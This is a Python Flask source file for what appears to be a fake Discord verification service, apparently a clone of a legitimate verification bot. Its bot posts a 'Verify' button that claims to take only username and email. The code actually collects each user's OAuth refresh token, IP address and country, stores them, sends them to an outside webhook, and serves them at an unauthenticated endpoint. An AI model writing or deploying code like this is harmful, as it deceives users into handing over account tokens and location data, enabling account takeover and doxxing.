from flask import Flask, request, redirect, jsonify
import requests
import sqlite3
import json
import time
import os
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# === CONFIGURATION ===
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI", "https://double-counter-clone.onrender.com/callback")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
BOT_TOKEN = os.getenv("BOT_TOKEN")
VERIFY_CHANNEL_ID = os.getenv("VERIFY_CHANNEL_ID", "1516478639858913322")

# === DATABASE ===
def init_db():
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        username TEXT,
        email TEXT,
        refresh_token TEXT,
        ip TEXT,
        country TEXT,
        timestamp INTEGER
    )''')
    conn.commit()
    conn.close()

init_db()

# === ROUTE 1: HOME – REDIRECT TO DISCORD OAUTH ===
@app.route('/')
def index():
    auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email"
    )
    return redirect(auth_url)

# === ROUTE 2: CALLBACK – GET USER DATA ===
@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No code provided", 400

    # Get IP and country
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    try:
        geo = requests.get(f'http://ip-api.com/json/{ip}?fields=country').json()
        country = geo.get('country', 'Unknown')
    except:
        country = 'Unknown'

    # Exchange code for tokens
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }
    resp = requests.post('https://discord.com/api/oauth2/token', data=data)
    if resp.status_code != 200:
        return f"Token exchange failed: {resp.text}", 400

    token_data = resp.json()
    access_token = token_data['access_token']
    refresh_token = token_data['refresh_token']

    # Get user info
    headers = {'Authorization': f'Bearer {access_token}'}
    user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
    if user_resp.status_code != 200:
        return "Failed to get user info", 400

    user_data = user_resp.json()
    user_id = user_data['id']

    # Save to database
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, username, email, refresh_token, ip, country, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (user_id, user_data['username'], user_data.get('email', ''), refresh_token, ip, country, int(time.time())))
    conn.commit()
    conn.close()

    # Webhook notification
    if WEBHOOK_URL:
        try:
            payload = {
                "content": f"""
🎯 **New User!**
**User:** {user_data['username']}
**ID:** {user_id}
**Email:** {user_data.get('email', 'N/A')}
**IP:** {ip}
**Country:** {country}
**Refresh Token:** `{refresh_token[:20]}...`
"""
            }
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass

    return """
    <html>
    <head><title>Verified</title></head>
    <body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0f;color:#fff;">
        <h1 style="color:#57F287;">✅ Verified!</h1>
        <p>You can close this tab.</p>
        <script>setTimeout(() => window.close(), 2000);</script>
    </body>
    </html>
    """

# === ROUTE 3: SEND EMBED ===
@app.route('/send_embed')
def send_embed():
    if not BOT_TOKEN:
        return "BOT_TOKEN not set", 400

    direct_oauth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email"
    )

    embed = {
        "title": "**Verification Required**",
        "description": (
            "Click the button below to verify your identity.\n\n"
            "We only request your basic info: username and email."
        ),
        "color": 0x5865F2,
        "footer": {"text": f"Secure · {datetime.now().strftime('%Y-%m-%d %H:%M')}"}
    }

    payload = {
        "embeds": [embed],
        "components": [{
            "type": 1,
            "components": [{
                "type": 2,
                "style": 5,
                "label": "Click to Verify",
                "url": direct_oauth_url
            }]
        }]
    }

    response = requests.post(
        f"https://discord.com/api/v10/channels/{VERIFY_CHANNEL_ID}/messages",
        headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
        json=payload,
        timeout=30
    )

    if response.status_code == 200:
        return "✅ Embed sent!", 200
    else:
        return f"❌ Error: {response.text}", 400

# === ROUTE 4: HEALTH CHECK ===
@app.route('/health')
def health():
    return "OK", 200

# === ROUTE 5: GET USER DATA (BY USER ID) ===
@app.route('/data/<user_id>')
def get_user_data(user_id):
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("SELECT username, email, ip, country, timestamp FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()

    if not row:
        return jsonify({"error": "User not found"}), 404

    return jsonify({
        "username": row[0],
        "email": row[1],
        "ip": row[2],
        "country": row[3],
        "timestamp": row[4]
    })

# === RUN ===
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
